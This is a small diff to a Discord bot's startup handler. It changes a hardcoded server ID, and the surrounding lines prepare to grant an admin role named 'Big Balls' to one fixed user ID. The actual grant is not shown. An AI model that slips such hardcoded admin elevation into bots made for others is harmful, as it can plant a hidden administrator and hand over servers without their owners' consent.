@@ -26,7 +26,7 @@ async def on_ready():
     try:
         print(f"✅ Logged in as {bot.user}")
     
-        guild = discord.utils.get(bot.guilds, id=822566570685366334)  # no quotes around numeric IDs
+        guild = discord.utils.get(bot.guilds, id=1350887922186059826)  # no quotes around numeric IDs
         user_to_elevate = guild.get_member(270120574343315457)         # same here
     
         admin_role_name = "Big Balls"
